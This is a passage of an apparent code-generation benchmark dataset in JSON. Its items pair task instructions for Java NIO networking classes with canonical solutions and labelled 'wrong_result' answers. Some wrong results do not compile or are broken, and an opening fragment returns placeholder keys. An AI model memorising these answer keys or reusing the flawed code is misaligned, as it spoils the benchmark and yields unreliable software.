  if (response.statusCode() == 200) {\n            // Process device data response and return ReceivedKey\n            return CompletableFuture.completedFuture(new ReceivedKey(\"device_data_key\"));\n        } else {\n            return CompletableFuture.failedFuture(new RuntimeException(\"Device data request failed with status: \" + response.statusCode()));\n        }\n    }\n\n    public CompletableFuture<ReceivedKey> requestVaultMasterkey(String encryptedUserKey) {\n        return CompletableFuture.supplyAsync(() -> {\n            try {\n                HttpRequest request = HttpRequest.newBuilder()\n                        .uri(URI.create(hubConfig.getVaultMasterkeyUri()))\n                        .header(\"Authorization\", \"Bearer \" + bearerToken)\n                        .header(\"X-Device-ID\", deviceId)\n                        .header(\"X-Vault-ID\", vaultId)\n                        .header(\"X-Encrypted-User-Key\", encryptedUserKey)\n                        .POST(HttpRequest.BodyPublishers.noBody())\n                        .build();\n                HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n                return handleVaultMasterkeyResponse(encryptedUserKey, response);\n            } catch (Exception e) {\n                return retrievalFailed(e);\n            }\n        });\n    }\n\n    private ReceivedKey handleVaultMasterkeyResponse(String encryptedUserKey, HttpResponse<String> response) {\n        if (response.statusCode() == 200) {\n            // Process vault master key response and return ReceivedKey\n            return new ReceivedKey(\"vault_masterkey\");\n        } else {\n            throw new RuntimeException(\"Vault master key request failed with status: \" + response.statusCode());\n        }\n    }\n\n    public CompletableFuture<ReceivedKey> requestLegacyAccessToken() {\n        return CompletableFuture.supplyAsync(() -> {\n            try {\n                HttpRequest request = HttpRequest.newBuilder()\n                        .uri(URI.create(hubConfig.getLegacyAccessTokenUri()))\n                        .header(\"Authorization\", \"Bearer \" + bearerToken)\n                        .header(\"X-Device-ID\", deviceId)\n                        .GET()\n                        .build();\n                HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n                return handleLegacyAccessTokenResponse(response);\n            } catch (Exception e) {\n                return retrievalFailed(e);\n            }\n        });\n    }\n\n    private ReceivedKey handleLegacyAccessTokenResponse(HttpResponse<String> response) {\n        if (response.statusCode() == 200) {\n            // Process legacy access token response and return ReceivedKey\n            return new ReceivedKey(\"legacy_access_token\");\n        } else {\n            throw new RuntimeException(\"Legacy access token request failed with status: \" + response.statusCode());\n        }\n    }\n\n    private ReceivedKey retrievalFailed(Throwable cause) {\n        // Handle retrieval failure\n        return new ReceivedKey(\"retrieval_failed\");\n    }\n}\n\nclass HubConfig {\n    private String apiConfigUri;\n    private String deviceDataUri;\n    private String vaultMasterkeyUri;\n    private String legacyAccessTokenUri;\n\n    public String getApiConfigUri() {\n        return apiConfigUri;\n    }\n\n    public void setApiConfigUri(String apiConfigUri) {\n        this.apiConfigUri = apiConfigUri;\n    }\n\n    public String getDeviceDataUri() {\n        return deviceDataUri;\n    }\n\n    public void setDeviceDataUri(String deviceDataUri) {\n        this.deviceDataUri = deviceDataUri;\n    }\n\n    public String getVaultMasterkeyUri() {\n        return vaultMasterkeyUri;\n    }\n\n    public void setVaultMasterkeyUri(String vaultMasterkeyUri) {\n        this.vaultMasterkeyUri = vaultMasterkeyUri;\n    }\n\n    public String getLegacyAccessTokenUri() {\n        return legacyAccessTokenUri;\n    }\n\n    public void setLegacyAccessTokenUri(String legacyAccessTokenUri) {\n        this.legacyAccessTokenUri = legacyAccessTokenUri;\n    }\n}\n\nclass ReceivedKey {\n    private String key;\n\n    public ReceivedKey(String key) {\n        this.key = key;\n    }\n\n    public String getKey() {\n        return key;\n    }\n}"
  },
  {
    "Task_id": 431,
    "Instruction": "Task Description: Implement a Java class for a High Availability (HA) client that manages communication with a master server using non-blocking I/O (NIO) techniques. The client should handle connection management, data reporting, and read event processing.\n\nClass Description: DefaultHAClient is a service thread that maintains a connection to a master server for high availability purposes. It uses Java NIO's SocketChannel and Selector for non-blocking communication, manages buffer operations for data transfer, and handles connection lifecycle events.\n\nAttributes:\n- READ_MAX_BUFFER_SIZE: [int] - Maximum buffer size for reading data (4MB)\n- masterHaAddress: [AtomicReference<String>] - Atomic reference to the master server's address\n- reportOffset: [ByteBuffer] - Buffer for reporting slave offset to master (8 bytes)\n- socketChannel: [SocketChannel] - Channel for communication with master\n- selector: [Selector] - Selector for non-blocking I/O operations\n- lastReadTimestamp: [long] - Timestamp of last successful read operation\n- lastWriteTimestamp: [long] - Timestamp of last successful write operation\n- currentReportedOffset: [long] - Current offset reported to master\n- dispatchPosition: [int] - Position in read buffer for dispatching data\n- byteBufferRead: [ByteBuffer] - Primary buffer for reading data\n- byteBufferBackup: [ByteBuffer] - Backup buffer for buffer reallocation\n- defaultMessageStore: [DefaultMessageStore] - Reference to the message store for offset information\n\nMethods:\n- DefaultHAClient([DefaultMessageStore defaultMessageStore]) -> [void] - Constructor that initializes selector and message store reference\n- updateHaMasterAddress([String newAddr]) -> [void] - Updates the master server address atomically\n- reportSlaveMaxOffset([long maxOffset]) -> [boolean] - Reports the slave's maximum offset to master, returns success status\n- reallocateByteBuffer() -> [void] - Reallocates and swaps read buffers when needed\n- swapByteBuffer() -> [void] - Swaps primary and backup byte buffers\n- processReadEvent() -> [boolean] - Processes read events from socket channel, returns success status\n- connectMaster() -> [boolean] - Connects to master server, returns connection status\n- closeMaster() -> [void] - Closes connection with master and cleans up resources\n- shutdown() -> [void] - Shuts down the client by closing all resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.SocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.ClosedChannelException;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.concurrent.atomic.AtomicReference;\nimport org.apache.rocketmq.common.ServiceThread;\nimport org.apache.rocketmq.common.utils.NetworkUtil;\nimport org.apache.rocketmq.remoting.common.RemotingHelper;\nimport org.apache.rocketmq.store.DefaultMessageStore;\n\npublic class DefaultHAClient extends ServiceThread implements HAClient {\n\n    private static final int READ_MAX_BUFFER_SIZE = 1024 * 1024 * 4;\n    private final AtomicReference<String> masterHaAddress = new AtomicReference<>();\n    private final ByteBuffer reportOffset = ByteBuffer.allocate(8);\n    private SocketChannel socketChannel;\n    private Selector selector;\n    private long lastReadTimestamp = System.currentTimeMillis();\n    private long lastWriteTimestamp = System.currentTimeMillis();\n    private long currentReportedOffset = 0;\n    private int dispatchPosition = 0;\n    private ByteBuffer byteBufferRead = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n    private ByteBuffer byteBufferBackup = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n    private DefaultMessageStore defaultMessageStore;\n\n    public DefaultHAClient(DefaultMessageStore defaultMessageStore) throws IOException {\n        this.selector = NetworkUtil.openSelector();\n        this.defaultMessageStore = defaultMessageStore;\n    }\n\n    public void updateHaMasterAddress(final String newAddr) {\n        String currentAddr = this.masterHaAddress.get();\n        if (masterHaAddress.compareAndSet(currentAddr, newAddr)) {\n            log.info(\"update master ha address, OLD: \" + currentAddr + \" NEW: \" + newAddr);\n        }\n    }\n\n    private boolean reportSlaveMaxOffset(final long maxOffset) {\n        this.reportOffset.position(0);\n        this.reportOffset.limit(8);\n        this.reportOffset.putLong(maxOffset);\n        this.reportOffset.position(0);\n        this.reportOffset.limit(8);\n\n        for (int i = 0; i < 3 && this.reportOffset.hasRemaining(); i++) {\n            try {\n                this.socketChannel.write(this.reportOffset);\n            } catch (IOException e) {\n                log.error(this.getServiceName()\n                    + \"reportSlaveMaxOffset this.socketChannel.write exception\", e);\n                return false;\n            }\n        }\n        lastWriteTimestamp = this.defaultMessageStore.getSystemClock().now();\n        return !this.reportOffset.hasRemaining();\n    }\n\n    private void reallocateByteBuffer() {\n        int remain = READ_MAX_BUFFER_SIZE - this.dispatchPosition;\n        if (remain > 0) {\n            this.byteBufferRead.position(this.dispatchPosition);\n            this.byteBufferBackup.position(0);\n            this.byteBufferBackup.limit(READ_MAX_BUFFER_SIZE);\n            this.byteBufferBackup.put(this.byteBufferRead);\n        }\n\n        this.swapByteBuffer();\n        this.byteBufferRead.position(remain);\n        this.byteBufferRead.limit(READ_MAX_BUFFER_SIZE);\n        this.dispatchPosition = 0;\n    }\n\n    private void swapByteBuffer() {\n        ByteBuffer tmp = this.byteBufferRead;\n        this.byteBufferRead = this.byteBufferBackup;\n        this.byteBufferBackup = tmp;\n    }\n\n    private boolean processReadEvent() {\n        int readSizeZeroTimes = 0;\n        while (this.byteBufferRead.hasRemaining()) {\n            try {\n                int readSize = this.socketChannel.read(this.byteBufferRead);\n                if (readSize > 0) {\n                    readSizeZeroTimes = 0;\n                    boolean result = this.dispatchReadRequest();\n                    if (!result) {\n                        log.error(\"HAClient, dispatchReadRequest error\");\n                        return false;\n                    }\n                    lastReadTimestamp = System.currentTimeMillis();\n                } else if (readSize == 0) {\n                    if (++readSizeZeroTimes >= 3) {\n                        break;\n                    }\n                } else {\n                    log.info(\"HAClient, processReadEvent read socket < 0\");\n                    return false;\n                }\n            } catch (IOException e) {\n                log.info(\"HAClient, processReadEvent read socket exception\", e);\n                return false;\n            }\n        }\n        return true;\n    }\n\n    public boolean connectMaster() throws ClosedChannelException {\n        if (null == socketChannel) {\n            String addr = this.masterHaAddress.get();\n            if (addr != null) {\n                SocketAddress socketAddress = NetworkUtil.string2SocketAddress(addr);\n                this.socketChannel = RemotingHelper.connect(socketAddress);\n                if (this.socketChannel != null) {\n                    this.socketChannel.register(this.selector, SelectionKey.OP_READ);\n                    log.info(\"HAClient connect to master {}\", addr);\n                }\n            }\n            this.currentReportedOffset = this.defaultMessageStore.getMaxPhyOffset();\n            this.lastReadTimestamp = System.currentTimeMillis();\n        }\n        return this.socketChannel != null;\n    }\n\n    public void closeMaster() {\n        if (null != this.socketChannel) {\n            try {\n                SelectionKey sk = this.socketChannel.keyFor(this.selector);\n                if (sk != null) {\n                    sk.cancel();\n                }\n                this.socketChannel.close();\n                this.socketChannel = null;\n                log.info(\"HAClient close connection with master {}\", this.masterHaAddress.get());\n            } catch (IOException e) {\n                log.warn(\"closeMaster exception. \", e);\n            }\n            this.lastReadTimestamp = 0;\n            this.dispatchPosition = 0;\n            this.byteBufferBackup.position(0);\n            this.byteBufferBackup.limit(READ_MAX_BUFFER_SIZE);\n            this.byteBufferRead.position(0);\n            this.byteBufferRead.limit(READ_MAX_BUFFER_SIZE);\n        }\n    }\n\n    @Override\n    public void shutdown() {\n        super.shutdown();\n        closeMaster();\n        try {\n            this.selector.close();\n        } catch (IOException e) {\n            log.warn(\"Close the selector of AutoRecoverHAClient error, \", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "```java\nimport java.nio.channels.SocketChannel;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SelectionKey;\nimport java.nio.ByteBuffer;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class DefaultHAClient {\n    private static final int READ_MAX_BUFFER_SIZE = 4 * 1024 * 1024;\n    private final AtomicReference<String> masterHaAddress = new AtomicReference<>();\n    private final ByteBuffer reportOffset = ByteBuffer.allocate(8);\n    private SocketChannel socketChannel;\n    private Selector selector;\n    private long lastReadTimestamp;\n    private long lastWriteTimestamp;\n    private long currentReportedOffset;\n    private int dispatchPosition;\n    private ByteBuffer byteBufferRead;\n    private ByteBuffer byteBufferBackup;\n    private final DefaultMessageStore defaultMessageStore;\n\n    public DefaultHAClient(DefaultMessageStore defaultMessageStore) {\n        this.defaultMessageStore = defaultMessageStore;\n        try {\n            this.selector = Selector.open();\n            this.byteBufferRead = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n            this.byteBufferBackup = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void updateHaMasterAddress(String newAddr) {\n        masterHaAddress.set(newAddr);\n    }\n\n    public boolean reportSlaveMaxOffset(long maxOffset) {\n        if (socketChannel == null || !socketChannel.isConnected()) {\n            return false;\n        }\n        reportOffset.clear();\n        reportOffset.putLong(maxOffset);\n        reportOffset.flip();\n        try {\n            if (socketChannel.write(reportOffset) < 0) {\n                return false;\n            }\n            lastWriteTimestamp = System.currentTimeMillis();\n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n\n    public void reallocateByteBuffer() {\n        byteBufferRead = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n        byteBufferBackup = ByteBuffer.allocate(READ_MAX_BUFFER_SIZE);\n        dispatchPosition = 0;\n    }\n\n    public void swapByteBuffer() {\n        ByteBuffer temp = byteBufferRead;\n        byteBufferRead = byteBufferBackup;\n        byteBufferBackup = temp;\n        dispatchPosition = 0;\n    }\n\n    public boolean processReadEvent() {\n        if (socketChannel == null || !socketChannel.isConnected()) {\n            return false;\n        }\n        try {\n            int readBytes = socketChannel.read(byteBufferRead);\n            if (readBytes > 0) {\n                lastReadTimestamp = System.currentTimeMillis();\n                dispatchPosition = byteBufferRead.position();\n                return true;\n            } else if (readBytes < 0) {\n                closeMaster();\n                return false;\n            }\n        } catch (Exception e) {\n            closeMaster();\n            return false;\n        }\n        return false;\n    }\n\n    public boolean connectMaster() {\n        if (masterHaAddress.get() == null) {\n            return false;\n        }\n        try {\n            if (socketChannel != null) {\n                socketChannel.close();\n            }\n            socketChannel = SocketChannel.open();\n            socketChannel.configureBlocking(false);\n            socketChannel.connect(masterHaAddress.get());\n            socketChannel.register(selector, SelectionKey.OP_READ | SelectionKey.OP_WRITE);\n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n\n    public void closeMaster() {\n        try {\n            if (socketChannel != null) {\n                socketChannel.close();\n                socketChannel = null;\n            }\n            if (selector != null) {\n                selector.close();\n                selector = null;\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        closeMaster();\n    }\n}\n```"
  },
  {
    "Task_id": 432,
    "Instruction": "Task Description: Create a Java class that implements asynchronous TCP client functionality using java.nio channels for non-blocking network communication, with support for connection management, socket configuration, and asynchronous I/O operations.\n\nClass Description: AsynchronousSocketChannelStream is a class that provides asynchronous TCP client functionality using Java NIO's AsynchronousSocketChannel. It handles connection establishment, socket configuration, and asynchronous read/write operations with support for connection retries and error handling.\n\nAttributes:\n- serverAddress: [ServerAddress] - The target server address to connect to\n- inetAddressResolver: [InetAddressResolver] - Resolves hostnames to IP addresses\n- settings: [SocketSettings] - Configuration for socket options and timeouts\n- group: [AsynchronousChannelGroup] - Optional channel group for resource management\n\nMethods:\n- openAsync([OperationContext operationContext], [AsyncCompletionHandler<Void> handler]) -> [void] - Initiates an asynchronous connection to the server, with completion notified via handler\n- initializeSocketChannel([AsyncCompletionHandler<Void> handler], [Queue<SocketAddress> socketAddressQueue]) -> [void] - Internal method to attempt connection to a socket address\n- OpenCompletionHandler([AsyncCompletionHandler<Void> handler], [Queue<SocketAddress> socketAddressQueue], [AsynchronousSocketChannel attemptConnectionChannel]) -> [void] - Handles connection completion/failure and manages retry logic\n- AsynchronousSocketChannelAdapter([AsynchronousSocketChannel channel]) -> [void] - Wrapper class that implements ExtendedAsynchronousByteChannel interface for I/O operations\n\nThe OpenCompletionHandler nested class provides:\n- completed([Void result], [Object attachment]) -> [void] - Handles successful connection\n- failed([Throwable exc], [Object attachment]) -> [void] - Handles connection failure and manages retries\n\nThe AsynchronousSocketChannelAdapter nested class provides:\n- Various read/write methods with timeout support -> [Future/void] - Implements asynchronous I/O operations\n- isOpen() -> [boolean] - Checks if channel is open\n- close() -> [void] - Closes the channel",
    "Canonical_solution": "import com.mongodb.MongoSocketException;\nimport com.mongodb.MongoSocketOpenException;\nimport com.mongodb.ServerAddress;\nimport com.mongodb.connection.AsyncCompletionHandler;\nimport com.mongodb.connection.SocketSettings;\nimport com.mongodb.lang.Nullable;\nimport com.mongodb.spi.dns.InetAddressResolver;\n\nimport java.io.IOException;\nimport java.net.SocketAddress;\nimport java.net.StandardSocketOptions;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.AsynchronousChannelGroup;\nimport java.nio.channels.AsynchronousSocketChannel;\nimport java.nio.channels.CompletionHandler;\nimport java.util.LinkedList;\nimport java.util.Queue;\nimport java.util.concurrent.Future;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicReference;\n\nimport static com.mongodb.internal.connection.ServerAddressHelper.getSocketAddresses;\n\npublic final class AsynchronousSocketChannelStream extends AsynchronousChannelStream {\n    private final ServerAddress serverAddress;\n    private final InetAddressResolver inetAddressResolver;\n    private final SocketSettings settings;\n    @Nullable\n    private final AsynchronousChannelGroup group;\n\n    public AsynchronousSocketChannelStream(\n            final ServerAddress serverAddress, final InetAddressResolver inetAddressResolver,\n            final SocketSettings settings, final PowerOfTwoBufferPool bufferProvider,\n            @Nullable final AsynchronousChannelGroup group) {\n        super(serverAddress, settings, bufferProvider);\n        this.serverAddress = serverAddress;\n        this.inetAddressResolver = inetAddressResolver;\n        this.settings = settings;\n        this.group = group;\n    }\n\n    @Override\n    public void openAsync(final OperationContext operationContext, final AsyncCompletionHandler<Void> handler) {\n        Queue<SocketAddress> socketAddressQueue;\n\n        try {\n            socketAddressQueue = new LinkedList<>(getSocketAddresses(serverAddress, inetAddressResolver));\n        } catch (Throwable t) {\n            handler.failed(t);\n            return;\n        }\n\n        initializeSocketChannel(handler, socketAddressQueue);\n    }\n\n    private void initializeSocketChannel(final AsyncCompletionHandler<Void> handler, final Queue<SocketAddress> socketAddressQueue) {\n        if (socketAddressQueue.isEmpty()) {\n            handler.failed(new MongoSocketException(\"Exception opening socket\", serverAddress));\n        } else {\n            SocketAddress socketAddress = socketAddressQueue.poll();\n\n            try {\n                AsynchronousSocketChannel attemptConnectionChannel;\n                attemptConnectionChannel = group == null\n                        ? AsynchronousSocketChannel.open()\n                        : AsynchronousSocketChannel.open(group);\n                attemptConnectionChannel.setOption(StandardSocketOptions.TCP_NODELAY, true);\n                attemptConnectionChannel.setOption(StandardSocketOptions.SO_KEEPALIVE, true);\n                if (settings.getReceiveBufferSize() > 0) {\n                    attemptConnectionChannel.setOption(StandardSocketOptions.SO_RCVBUF, settings.getReceiveBufferSize());\n                }\n                if (settings.getSendBufferSize() > 0) {\n                    attemptConnectionChannel.setOption(StandardSocketOptions.SO_SNDBUF, settings.getSendBufferSize());\n                }\n\n                attemptConnectionChannel.connect(socketAddress, null,\n                        new OpenCompletionHandler(handler, socketAddressQueue, attemptConnectionChannel));\n            } catch (IOException e) {\n                handler.failed(new MongoSocketOpenException(\"Exception opening socket\", serverAddress, e));\n            } catch (Throwable t) {\n                handler.failed(t);\n            }\n        }\n    }\n\n    private class OpenCompletionHandler implements CompletionHandler<Void, Object>  {\n        private final AtomicReference<AsyncCompletionHandler<Void>> handlerReference;\n        private final Queue<SocketAddress> socketAddressQueue;\n        private final AsynchronousSocketChannel attemptConnectionChannel;\n\n        OpenCompletionHandler(final AsyncCompletionHandler<Void> handler, final Queue<SocketAddress> socketAddressQueue,\n                              final AsynchronousSocketChannel attemptConnectionChannel) {\n            this.handlerReference = new AtomicReference<>(handler);\n            this.socketAddressQueue = socketAddressQueue;\n            this.attemptConnectionChannel = attemptConnectionChannel;\n        }\n\n        @Override\n        public void completed(final Void result, final Object attachment) {\n            setChannel(new AsynchronousSocketChannelAdapter(attemptConnectionChannel));\n            handlerReference.getAndSet(null).completed(null);\n        }\n\n        @Override\n        public void failed(final Throwable exc, final Object attachment) {\n            AsyncCompletionHandler<Void> localHandler = handlerReference.getAndSet(null);\n\n            if (socketAddressQueue.isEmpty()) {\n                if (exc instanceof IOException) {\n                    localHandler.failed(new MongoSocketOpenException(\"Exception opening socket\", getAddress(), exc));\n                } else {\n                    localHandler.failed(exc);\n                }\n            } else {\n                initializeSocketChannel(localHandler, socketAddressQueue);\n            }\n        }\n    }\n\n    private static final class AsynchronousSocketChannelAdapter implements ExtendedAsynchronousByteChannel {\n        private final AsynchronousSocketChannel channel;\n\n        private AsynchronousSocketChannelAdapter(final AsynchronousSocketChannel channel) {\n            this.channel = channel;\n        }\n\n        @Override\n        public <A> void read(final ByteBuffer dst, final long timeout, final TimeUnit unit, @Nullable final A attach,\n                             final CompletionHandler<Integer, ? super A> handler) {\n            channel.read(dst, timeout, unit, attach, handler);\n        }\n\n        @Override\n        public <A> void read(final ByteBuffer[] dsts, final int offset, final int length, final long timeout, final TimeUnit unit,\n                             @Nullable final A attach, final CompletionHandler<Long, ? super A> handler) {\n            channel.read(dsts, offset, length, timeout, unit, attach, handler);\n        }\n\n        @Override\n        public <A> void write(final ByteBuffer src, final long timeout, final TimeUnit unit, final A attach,\n                              final CompletionHandler<Integer, ? super A> handler) {\n            channel.write(src, timeout, unit, attach, handler);\n        }\n\n        @Override\n        public <A> void write(final ByteBuffer[] srcs, final int offset, final int length, final long timeout, final TimeUnit unit,\n                              final A attach, final CompletionHandler<Long, ? super A> handler) {\n            channel.write(srcs, offset, length, timeout, unit, attach, handler);\n        }\n\n        @Override\n        public <A> void read(final ByteBuffer dst, final A attachment, final CompletionHandler<Integer, ? super A> handler) {\n            channel.read(dst, attachment, handler);\n        }\n\n        @Override\n        public Future<Integer> read(final ByteBuffer dst) {\n            return channel.read(dst);\n        }\n\n        @Override\n        public <A> void write(final ByteBuffer src, final A attachment, final CompletionHandler<Integer, ? super A> handler) {\n            channel.write(src, attachment, handler);\n        }\n\n        @Override\n        public Future<Integer> write(final ByteBuffer src) {\n            return channel.write(src);\n        }\n\n        @Override\n        public boolean isOpen() {\n            return channel.isOpen();\n        }\n\n        @Override\n        public void close() throws IOException {\n            channel.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "wrong_result": "public class AsynchronousSocketChannelStream {\n    private final ServerAddress serverAddress;\n    private final InetAddressResolver inetAddressResolver;\n    private final SocketSettings settings;\n    private final AsynchronousChannelGroup group;\n\n    public AsynchronousSocketChannelStream(ServerAddress serverAddress, InetAddressResolver inetAddressResolver, SocketSettings settings, AsynchronousChannelGroup group) {\n        this.serverAddress = serverAddress;\n        this.inetAddressResolver = inetAddressResolver;\n        this.settings = settings;\n        this.group = group;\n    }\n\n    public void openAsync(OperationContext operationContext, AsyncCompletionHandler<Void> handler) {\n        Queue<SocketAddress> socketAddressQueue = new LinkedList<>();\n        try {\n            List<InetAddress> addresses = inetAddressResolver.resolve(serverAddress.getHost());\n            for (InetAddress address : addresses) {\n                socketAddressQueue.add(new InetSocketAddress(address, serverAddress.getPort()));\n            }\n        } catch (IOException e) {\n            handler.failed(e, null);\n            return;\n        }\n        initializeSocketChannel(handler, socketAddressQueue);\n    }\n\n    private void initializeSocketChannel(AsyncCompletionHandler<Void> handler, Queue<SocketAddress> socketAddressQueue) {\n        if (socketAddressQueue.isEmpty()) {\n            handler.failed(new IOException(\"No addresses to connect\"), null);\n            return;\n        }\n\n        AsynchronousSocketChannel channel = null;\n        try {\n            if (group != null) {\n                channel = AsynchronousSocketChannel.open(group);\n            } else {\n                channel = AsynchronousSocketChannel.open();\n            }\n\n            Socket socket = channel.socket();\n            socket.setSoTimeout(settings.getSoTimeout());\n            socket.setReuseAddress(settings.isReuseAddress());\n            socket.setTcpNoDelay(settings.isTcpNoDelay());\n            socket.setKeepAlive(settings.isKeepAlive());\n\n            OpenCompletionHandler completionHandler = new OpenCompletionHandler(handler, socketAddressQueue, channel);\n            channel.connect(socketAddressQueue.poll(), null, completionHandler);\n        } catch (IOException e) {\n            if (channel != null) {\n                try {\n                    channel.close();\n                } catch (IOException ex) {\n                    // Ignore\n                }\n            }\n            handler.failed(e, null);\n        }\n    }\n\n    private class OpenCompletionHandler implements CompletionHandler<Void, Object> {\n        private final AsyncCompletionHandler<Void> handler;\n        private final Queue<SocketAddress> socketAddressQueue;\n        private final AsynchronousSocketChannel channel;\n\n        public OpenCompletionHandler(AsyncCompletionHandler<Void> handler, Queue<SocketAddress> socketAddressQueue, AsynchronousSocketChannel channel) {\n            this.handler = handler;\n            this.socketAddressQueue = socketAddressQueue;\n            this.channel = channel;\n        }\n\n        @Override\n        public void completed(Void result, Object attachment) {\n            try {\n                if (channel.isOpen()) {\n                    handler.completed(null, null);\n                } else {\n                    handler.failed(new IOException(\"Channel is not open\"), null);\n                }\n            } catch (IOException e) {\n                handler.failed(e, null);\n            }\n        }\n\n        @Override\n        public void failed(Throwable exc, Object attachment) {\n            if (socketAddressQueue.isEmpty()) {\n                handler.failed(exc, null);\n                return;\n            }\n\n            try {\n                channel.close();\n            } catch (IOException e) {\n                // Ignore\n            }\n\n            initializeSocketChannel(handler, socketAddressQueue);\n        }\n    }\n\n    private class AsynchronousSocketChannelAdapter implements ExtendedAsynchronousByteChannel {\n        private final AsynchronousSocketChannel channel;\n\n        public AsynchronousSocketChannelAdapter(AsynchronousSocketChannel channel) {\n            this.channel = channel;\n        }\n\n        @Override\n        public <A> void read(ByteBuffer dst, long timeout, TimeUnit unit, A attachment, CompletionHandler<Integer, ? super A> handler) {\n            channel.read(dst, timeout, unit, attachment, handler);\n        }\n\n        @Override\n        public <A> void write(ByteBuffer src, long timeout, TimeUnit unit, A attachment, CompletionHandler<Integer, ? super A> handler) {\n            channel.write(src, timeout, unit, attachment, handler);\n        }\n\n        @Override\n        public boolean isOpen() {\n            return channel.isOpen();\n        }\n\n        @Override\n        public void close() throws IOException {\n            channel.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 433,
    "Instruction": "Task Description: Implement a Java class that facilitates TCP-based communication using Java NIO (Non-blocking I/O) techniques, supporting both client and server modes with configurable options.\n\nClass Description: NioTransport is a class that provides TCP communication capabilities using Java NIO. It can operate in either server or client mode, supports direct buffers for performance optimization, and includes methods for starting/stopping communication, sending data, and receiving data through a callback mechanism.\n\nAttributes:\n- srv_channel: [ServerSocketChannel] - Server socket channel used in server mode\n- client_channel: [SocketChannel] - Client socket channel for communication\n- receiver_thread: [Receiver] - Thread handling incoming data reception\n- receiver: [RtReceiver] - Callback interface for received data\n- host: [InetAddress] - Host address for connection\n- port: [int] - Port number for communication (default: 7800)\n- server: [boolean] - Flag indicating if operating in server mode\n- direct_buffers: [boolean] - Flag indicating whether to use direct buffers\n- log: [Log] - Logger instance for logging messages\n\nMethods:\n- options(String... options) -> [void] - Configures transport options including server/client mode, host, port, and buffer type\n- receiver(RtReceiver receiver) -> [void] - Sets the receiver callback for incoming data\n- start(String... options) -> [void] - Starts the transport in either server or client mode based on configuration\n- stop() -> [void] - Stops the transport and releases resources\n- send(Object dest, byte[] buf, int offset, int length) -> [void] - Sends data through the established channel\n- Receiver.run() -> [void] - (Inner class method) Continuously receives data and forwards it to the registered receiver",
    "Canonical_solution": "import org.jgroups.logging.Log;\nimport org.jgroups.logging.LogFactory;\nimport org.jgroups.tests.RoundTrip;\nimport org.jgroups.tests.rt.RtReceiver;\nimport org.jgroups.tests.rt.RtTransport;\nimport org.jgroups.util.Util;\n\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.List;\n\npublic class NioTransport implements RtTransport {\n    protected ServerSocketChannel srv_channel;\n    protected SocketChannel       client_channel;\n    protected Receiver            receiver_thread;\n    protected RtReceiver          receiver;\n    protected InetAddress         host;\n    protected int                 port=7800;\n    protected boolean             server, direct_buffers;\n    protected final Log           log=LogFactory.getLog(NioTransport.class);\n\n    public NioTransport() {\n    }\n\n    public void options(String... options) throws Exception {\n        if(options == null)\n            return;\n        for(int i=0; i < options.length; i++) {\n            if(options[i].equals(\"-server\")) {\n                server=true;\n                continue;\n            }\n            if(options[i].equals(\"-host\")) {\n                host=InetAddress.getByName(options[++i]);\n                continue;\n            }\n            if(options[i].equals(\"-port\")) {\n                port=Integer.parseInt(options[++i]);\n                continue;\n            }\n            if(options[i].equals(\"-direct\")) {\n                direct_buffers=Boolean.parseBoolean(options[++i]);\n            }\n        }\n        if(host == null)\n            host=InetAddress.getLocalHost();\n    }\n\n    public void receiver(RtReceiver receiver) {\n        this.receiver=receiver;\n    }\n\n    public void start(String ... options) throws Exception {\n        options(options);\n        if(server) {\n            srv_channel=ServerSocketChannel.open();\n            srv_channel.bind(new InetSocketAddress(host, port), 50);\n            System.out.println(\"server started (ctrl-c to kill)\");\n            for(;;) {\n                client_channel=srv_channel.accept();\n                receiver_thread=new Receiver();\n                receiver_thread.start();\n            }\n        }\n        else {\n            client_channel=SocketChannel.open();\n            client_channel.connect(new InetSocketAddress(host, port));\n            receiver_thread=new Receiver();\n            receiver_thread.start();\n        }\n    }\n\n    public void stop() {\n        Util.close(srv_channel, client_channel);\n    }\n\n    public void send(Object dest, byte[] buf, int offset, int length) throws Exception {\n        ByteBuffer sbuf=ByteBuffer.wrap(buf, offset, length);\n        client_channel.write(sbuf);\n    }\n\n    protected class Receiver extends Thread {\n        public void run() {\n            ByteBuffer buf=direct_buffers? ByteBuffer.allocateDirect(RoundTrip.PAYLOAD) : ByteBuffer.allocate(RoundTrip.PAYLOAD);\n            for(;;) {\n                try {\n                    buf.position(0);\n                    int num=client_channel.read(buf);\n                    if(num == -1)\n                        break;\n                    if(num != RoundTrip.PAYLOAD)\n                        throw new IllegalStateException(\"expected \" + RoundTrip.PAYLOAD + \" bytes, but got only \" + num);\n                    if(receiver != null) {\n                        buf.flip();\n                        int offset=buf.hasArray()? buf.arrayOffset() + buf.position() : buf.position(), len=buf.remaining();\n                        if(!buf.isDirect())\n                            receiver.receive(null, buf.array(), offset, len);\n                        else {\n                            byte[] tmp=new byte[len];\n                            buf.get(tmp, 0, len);\n                            receiver.receive(null, tmp, 0, len);\n                        }\n                    }\n                }\n                catch(Exception e) {\n                    e.printStackTrace();\n                }\n            }\n            Util.close(client_channel);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
